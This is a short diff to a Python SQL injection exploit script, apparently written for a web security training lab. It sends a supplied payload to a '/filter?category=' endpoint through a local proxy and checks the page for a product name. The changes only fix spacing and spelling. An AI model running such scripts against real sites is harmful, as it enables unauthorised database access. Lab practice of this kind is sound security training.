@@ -10,7 +10,7 @@ proxy = {"http": "http://127.0.0.1:8800", "https": "http://127.0.0.1:8800"}
 def exploit_sql_injection(url, payload):
     uri = "/filter?category="
     r = requests.get(url + uri + payload, verify=False, proxies=proxy)
-    if  "Sarcastic 9 Ball" in r.text:
+    if "Sarcastic 9 Ball" in r.text:
         return True
     return False
 
@@ -25,6 +25,6 @@ if __name__ == "__main__":
         sys.exit(-1)
 
     if exploit_sql_injection(url, payload):
-        print("[+] SQL injections succesful")
+        print("[+] SQL injections successful")
     else:
-        print("[-] SQL injections unsucesful")
+        print("[-] SQL injections unsuccessful")
